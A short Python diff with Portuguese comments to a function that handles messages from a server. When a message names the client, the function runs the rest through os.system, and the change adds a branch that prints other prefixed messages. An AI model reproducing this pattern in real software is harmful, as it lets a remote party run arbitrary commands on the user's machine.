@@ -20,7 +20,9 @@ def conServ():
                 if msg[1:i] == f"{nome}":
                     os.system(msg[(i+1):])
             else:
-                naodeerro = "x"
+                i = msg.index("$")
+                if msg[0:i] == f"{nome}":
+                    print(msg[(i+1):])
                # os.system(msg) #isso ta funcionando mas parece estar com erro
         except:
             print('Deu Ruim')
